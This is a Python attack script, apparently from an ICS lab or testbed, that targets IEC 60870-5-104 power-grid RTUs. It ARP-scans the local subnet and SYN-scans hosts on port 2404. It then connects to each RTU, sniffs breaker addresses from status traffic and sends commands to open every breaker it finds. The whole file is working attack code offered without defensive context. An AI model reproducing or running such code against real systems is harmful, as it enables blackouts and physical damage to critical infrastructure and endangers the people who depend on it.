#!/usr/bin/env python3

import sys
from threading import Thread
import socket
from time import sleep
import scapy.all as scapy
import netifaces as nic
import ipaddress
from nefics.IEC104.dissector import APDU
from iec104 import IEC104, get_command

IEC104_PORT = 2404

if __name__ == '__main__':
    iface = scapy.get_working_if()
    print('[+] Using ' + iface)
    address = nic.ifaddresses(iface)[nic.AF_INET][0]
    subnet = ipaddress.ip_network(address['addr'] + '/' + address['netmask'], strict=False)
    nethosts = list(subnet.hosts())
    print('[+] Searching for live hosts in {0:s} ...'.format(str(subnet)))
    alive = []
    def arpscan(hosts: list):
        global alive
        global address
        for host in hosts:
            if str(host) != address['addr']:
                print('[-] Trying {0:s} ...\r'.format(str(host)), end='')
                response = scapy.sr1(scapy.ARP(op=0x1, psrc=address['addr'], pdst=str(host)), iface=iface, retry=0, timeout=1, verbose=0)
                if response is not None and response.haslayer('ARP') and response['ARP'].op == 0x2:
                    print('   [!] {0:s} is alive'.format(str(host)))
                    alive.append(str(host))
    threads = []
    for hosts in [nethosts[i:i + 16] for i in range(0, len(nethosts), 16)]:
        t = Thread(target=arpscan, kwargs={'hosts': hosts})
        t.start()
        threads.append(t)
    while len(threads):
        for t in threads:
            t.join(1)
            if not t.is_alive():
                threads.pop(threads.index(t))
    print('[+] Scanning for RTUs ...')
    rtus = []
    for host in alive:
        if host != address['addr']:
            sport = scapy.RandShort()
            print('[-] Trying {0:s} ...\r'.format(host), end='')
            response = scapy.sr1(scapy.IP(src=address['addr'], dst=host)/scapy.TCP(sport=sport, dport=IEC104_PORT, flags='S'), iface=iface, timeout=0.1, retry=0, verbose=0)
            if response is None:
                # Filtered
                pass
            elif response.haslayer('TCP'):
                if response['TCP'].flags == 0x12:
                    # Open port -- Probably an RTU
                    reset = scapy.sr(scapy.IP(src=address['addr'], dst=host)/scapy.TCP(sport=sport, dport=IEC104_PORT, flags='R'), iface=iface, timeout=0.1, verbose=0)
                    print('   [!] Found RTU at %s' % str(host))
                    rtus.append(str(host))
                elif response['TCP'].flags == 0x14:
                    # Closed
                    pass
            elif response.haslayer('ICMP') and response['ICMP'].type == 3 and response['ICMP'].code in [1, 2, 3, 9, 10, 13]:
                # Filtered
                pass
    print('[+] Scanning complete !' + ' '*20)
    print('[+] Probing RTUs ...')
    rtu_comm = {}
    rtu_data = {}
    rtu_threads = {}
    rtu_thred_killswitch = {}
    rtu_hasbreakers = {}
    def handle_rtu(s: socket.socket, k: str):
        global rtu_data
        global rtu_thred_killswitch
        global rtu_hasbreakers
        if k not in rtu_data.keys():
            rtu_data[k] = {'ioas': {}}
        while not rtu_thred_killswitch[k]:
            try:
                data = s.recv(1024)
                apdu = APDU(data)
                data = get_command(apdu)
                rtu_data[k]['tx'] = data['tx']
                rtu_data[k]['rx'] = data['rx']
                value = data['value']
                if apdu['ASDU'].TypeId == 0x3:
                    if k not in rtu_hasbreakers.keys():
                        rtu_hasbreakers[k] = {}    
                        rtu_hasbreakers[k]['ioas'] = []
                        print('   [!] RTU in {0:s} has breakers'.format(k))
                    if data['ioa'] not in rtu_hasbreakers[k]['ioas']:
                        rtu_hasbreakers[k]['ioas'].append(data['ioa'])
                        print('   [!] New breaker found in {0:s}. IOA: {1:d}'.format(k, data['ioa']))
            except (socket.timeout, KeyError, IndexError):
                pass
    for r in rtus:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        s.settimeout(0.3)
        try:
            rtu_comm[r] = s
            rtu_threads[r] = Thread(target=handle_rtu, kwargs={'s': s, 'k': r})
            rtu_thred_killswitch[r] = False
            s.connect((r, IEC104_PORT))
            rtu_threads[r].start()
        except socket.error:
            pass
    sleep(30)
    print('[+] Opening all breakers ...')
    for k, v in rtu_hasbreakers.items():
        print('   [-] Opening breakers in {0:s} ...'.format(k))
        for ioa in v['ioas']:
            print('      [#] Opening IOA {:d} ...'.format(ioa))
            rtu_data[k]['tx'] += 1
            data = IEC104(50, ioa).get_apdu(0, rtu_data[k]['tx'], rtu_data[k]['rx'], 1)
            rtu_comm[k].send(data)
            sleep(2)
    print('[+] Done!')
    print('[+] Closing connections ...')
    for r in rtus:
        rtu_thred_killswitch[r] = True
        rtu_threads[r].join()
        rtu_comm[r].close()
    print('[+] Bye!')
